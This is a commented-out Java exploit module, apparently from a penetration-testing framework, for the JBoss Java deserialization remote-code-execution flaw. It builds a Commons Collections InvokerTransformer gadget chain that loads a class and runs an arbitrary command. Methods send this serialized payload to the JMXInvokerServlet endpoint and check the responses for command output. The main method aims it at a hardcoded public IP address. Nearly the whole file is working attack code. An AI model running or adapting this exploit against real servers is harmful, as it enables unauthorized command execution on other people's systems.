//package com.orleven.tentacle.permeate.script;
//
//import java.io.ByteArrayOutputStream;
//import java.io.ObjectOutputStream;
//import java.lang.annotation.Retention;
//import java.lang.reflect.Constructor;
//import java.net.URL;
//import java.net.URLClassLoader;
//import java.net.URLEncoder;
//import java.util.HashMap;
//import java.util.Map;
//import java.util.regex.Matcher;
//import java.util.regex.Pattern;
//
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.TransformedMap;
//
//import com.orleven.tentacle.core.IOC;
//import com.orleven.tentacle.helper.HTTPMessageHelper;
//import com.orleven.tentacle.permeate.imp.ExecCommandImp;
//import com.orleven.tentacle.permeate.imp.PrintImp;
//import com.orleven.tentacle.permeate.imp.ProveImp;
//import com.orleven.tentacle.permeate.info.HTTPServerInfo;
//import com.orleven.tentacle.permeate.info.ProveExistInfo;
//import com.orleven.tentacle.permeate.script.base.AbstractHTTPBase;
//
///**
// * JBoss Java 反序列化漏洞
// * @author orleven
// * @date 2017年1月5日
// */
//public class JBossJavaDeserializeRCE  extends AbstractHTTPBase implements ProveImp,ExecCommandImp,PrintImp{
//
//	private HTTPMessageHelper hTTPMessageHelp;
//	
//	public JBossJavaDeserializeRCE(){
//		setVulName("JBoss Java 反序列化漏洞");
//		setVulNumber("暂无");
//	}
//	
//	/**
//	 * 初始化
//	 */
//	public void init(HTTPServerInfo hTTPServerInfo) {
//		hTTPMessageHelp = IOC.instance().getClassobj(HTTPMessageHelper.class);
//		setProveExistInfo(IOC.instance().getClassobj(ProveExistInfo.class));
//		setHTTPServerInfo(hTTPServerInfo);
//	}
//
//	@Override
//	public void println() {
//		System.out.println("----------------------------------------");
//		System.out.println(getHTTPServerInfo().getip()+":"+getHTTPServerInfo().getPort());
//		System.out.println(getHTTPServerInfo().getTargetUrl());
//		for(int i=0;i<getProveExistInfo().getRetDate().size();i++){
//			System.out.println(getProveExistInfo().getRetDate().get(i));		
//		}
//	}
//
//	@Override
//	public void execCommand(String command) {
//		try {
//			if(getProveExistInfo().getIsVulnerable()!=-1){
//				hTTPMessageHelp.httpPost(getHTTPServerInfo().getTargetUrl(), getHTTPServerInfo().getHttpHeaders(), getCommandPayload(command));
//				String str = hTTPMessageHelp.getResponseBody().split("==========")[1];
//				Pattern pattern = Pattern.compile(getProveExistInfo().getProveFlag());
//				Matcher matcher = pattern.matcher(str);
//				if (matcher.find() == true) {
//					//命令执行成功
//					getProveExistInfo().getRetDate().add(command + " => " + str);
//				}else{
//					//命令执行失败
//					getProveExistInfo().getRetDate().add(command + " => " + "False !");
//				}
//				getProveExistInfo().getSendDate().add(getHTTPServerInfo().getTargetUrl());
//			}
//		} catch (Exception e) {
//			e.printStackTrace();
//			getProveExistInfo().getRetDate().add("Error occurred in " + this.getClass().getName() + " !");
//		}
//	}
//
//	@Override
//	public void prove() {
//		try {
//			getHTTPServerInfo().getHttpHeaders().put("Charsert", "UTF-8");
//			getHTTPServerInfo().getHttpHeaders().put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0");
//			getHTTPServerInfo().getHttpHeaders().put("Accept", "*/*");
//			getHTTPServerInfo().getHttpHeaders().put("Accept-Encoding", "gzip, deflate");
//			hTTPMessageHelp.httpGet(getHTTPServerInfo().getTargetUrl(), getHTTPServerInfo().getHttpHeaders());
//			String result = hTTPMessageHelp.getResponseAllHeaders().get("Charsert");		
//			getProveExistInfo().setProveFlag("id");
//			if (hTTPMessageHelp.getResponseAllHeaders().get("Content-Type").indexOf("MarshalledValue") >= 0) {
//				// 存在漏洞
//				getHTTPServerInfo().getHttpHeaders().put("content-Type","application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
//				hTTPMessageHelp.httpPost(getHTTPServerInfo().getTargetUrl(), getHTTPServerInfo().getHttpHeaders(), getCommandPayload("id"));
//				String str = hTTPMessageHelp.getResponseBody().split("==========")[1];
//				Pattern pattern = Pattern.compile(getProveExistInfo().getProveFlag());
//				Matcher matcher = pattern.matcher(str);
//				if (matcher.find() == true) {
//					//命令执行成功
//					getProveExistInfo().setIsVulnerable(1);
//					getProveExistInfo().getRetDate().add("id => " + str);
//				}else{
//					//命令执行失败
//					getProveExistInfo().getRetDate().add("id => " + "False !");
//				}
//			}else{
//				getProveExistInfo().setIsVulnerable(-1);
//				getProveExistInfo().getRetDate().add("Vulnerability does not exist !");
//			}
//			getProveExistInfo().getSendDate().add(getHTTPServerInfo().getTargetUrl());
//		} catch (Exception e) {
//			e.printStackTrace();
//			getProveExistInfo().getRetDate().add("Error occurred in " + this.getClass().getName() + " !");
//		}
//	}
//	
//	/**
//	 * 生成执行指定命令的payload
//	 * @param command
//	 * @return
//	 * @throws Exception
//	 */
//	private byte[] getCommandPayload(String command) throws Exception {
//		String ClassPath = "file:../.readme.html.tmp";
//		Transformer transforms[] = { new ConstantTransformer(URLClassLoader.class),
//				new InvokerTransformer("getConstructor", new Class[] { Class[].class },
//						new Object[] { new Class[] { java.net.URL[].class } }),
//				new InvokerTransformer("newInstance", new Class[] { Object[].class },
//						new Object[] { new Object[] { new URL[] { new URL(ClassPath) } } }),
//				new InvokerTransformer("loadClass", new Class[] { String.class },
//						new Object[] { "com.payload.RunCommand" }),
//				new InvokerTransformer("getConstructor", new Class[] { Class[].class },
//						new Object[] { new Class[] { String.class } }),
//				new InvokerTransformer("newInstance", new Class[] { Object[].class },
//						new Object[] { new String[] { command } }) };
//		Transformer transformerChain = new ChainedTransformer(transforms);
//		Map innermap = new HashMap();
//		innermap.put("value", "value");
//		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
//		Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//		Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, java.util.Map.class });
//		ctor.setAccessible(true);
//		Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
//		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
//		ObjectOutputStream out = new ObjectOutputStream(bo);
//		out.writeObject(instance);
//		out.flush();
//		out.close();
//		return bo.toByteArray();
//	}
//
//	public static void main(String[] args) {
//		HTTPServerInfo hTTPServerInfo = IOC.instance().getHTTPServerInfo(HTTPServerInfo.class, "134.96.142.171","8080","","/invoker/JMXInvokerServlet");
//		JBossJavaDeserializeRCE jBossJavaDeserializeRCE = new JBossJavaDeserializeRCE();
//		jBossJavaDeserializeRCE.init(hTTPServerInfo);
//		jBossJavaDeserializeRCE.prove();
//		jBossJavaDeserializeRCE.println();
//		ProveExistInfo proveExistInfo = jBossJavaDeserializeRCE.getProveExistInfo();
//	}
//
//}
